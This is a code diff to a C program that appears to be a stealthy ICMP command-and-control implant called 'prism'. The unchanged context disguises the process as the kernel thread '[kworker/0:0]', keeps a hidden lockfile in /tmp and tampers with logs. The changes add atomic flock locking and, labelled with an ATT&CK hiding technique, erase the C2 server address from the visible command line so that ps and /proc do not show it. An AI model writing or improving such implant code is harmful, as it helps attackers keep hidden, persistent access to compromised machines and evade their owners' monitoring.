@@ -34,6 +34,8 @@
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <fcntl.h>
+#include <sys/file.h>
 
 #define FAKE_NAME   "[kworker/0:0]"
 #define LOCKFILE    "/tmp/.prism.lock"
@@ -260,24 +262,24 @@ static void spoof_process_name(int argc, char *argv[])
     if (f) { fprintf(f, "%s", FAKE_NAME); fclose(f); }
 }
 
+/* lockfile atomico con flock — previene race condition */
+static int lock_fd = -1;
+
 static int already_running(void)
 {
-    FILE *lf = fopen(LOCKFILE, "r");
-    if (!lf) return 0;
-    pid_t old_pid;
-    fscanf(lf, "%d", &old_pid);
-    fclose(lf);
-    char proc_path[64];
-    snprintf(proc_path, sizeof(proc_path), "/proc/%d", old_pid);
-    if (access(proc_path, F_OK) == 0) return 1;
-    unlink(LOCKFILE);
+    lock_fd = open(LOCKFILE, O_CREAT | O_RDWR, 0600);
+    if (lock_fd < 0) return 0;
+    if (flock(lock_fd, LOCK_EX | LOCK_NB) < 0) return 1; /* già lockato */
     return 0;
 }
 
 static void create_lockfile(void)
 {
-    FILE *lf = fopen(LOCKFILE, "w");
-    if (lf) { fprintf(lf, "%d\n", getpid()); fclose(lf); }
+    if (lock_fd >= 0) {
+        char buf[16];
+        snprintf(buf, sizeof(buf), "%d\n", getpid());
+        write(lock_fd, buf, strlen(buf));
+    }
 }
 
 static uint16_t icmp_checksum(const uint8_t *buf, size_t len)
@@ -480,6 +482,14 @@ int main(int argc, char *argv[])
         return 1;
     }
 
+    /* T1564.001 — nasconde IP C2 da /proc/PID/cmdline e ps aux.
+     * Copia l'IP in un buffer locale prima di azzerare argv[1],
+     * così tamper_logs() continua a filtrare le righe corrette. */
+    char c2_ip_copy[INET_ADDRSTRLEN];
+    strncpy(c2_ip_copy, argv[1], sizeof(c2_ip_copy) - 1);
+    c2_ip_copy[sizeof(c2_ip_copy) - 1] = '\0';
+    memset(argv[1], 0, strlen(argv[1]));
+
     int ttl = 64;
     setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
 
@@ -494,7 +504,7 @@ int main(int argc, char *argv[])
 
     uint16_t seq = 1;
     uint16_t log_clean_counter = 0;
-    const char *c2_ip_str = argv[1];
+    const char *c2_ip_str = c2_ip_copy;
 
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
 
